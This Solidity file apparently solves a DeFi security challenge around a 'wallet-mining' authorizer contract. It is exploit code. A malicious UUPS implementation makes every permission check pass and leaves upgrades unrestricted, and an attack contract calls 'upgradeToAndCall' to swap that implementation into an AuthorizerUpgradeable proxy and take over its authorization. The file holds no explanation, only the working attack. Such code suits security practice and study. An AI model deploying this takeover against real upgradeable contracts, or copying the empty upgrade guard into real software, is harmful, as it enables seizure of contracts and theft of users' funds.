// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "../wallet-mining/AuthorizerUpgradeable.sol";

contract lalala is UUPSUpgradeable
{
    function can(address x, address y) public returns(bool)
    {
        return true;
    }

    function _authorizeUpgrade(address imp) internal override {}

}

contract attackTymeyay
{
    function attack(AuthorizerUpgradeable authUp) public
    {
        lalala imp = new lalala();
        authUp.upgradeToAndCall(address(imp), "");
    }
}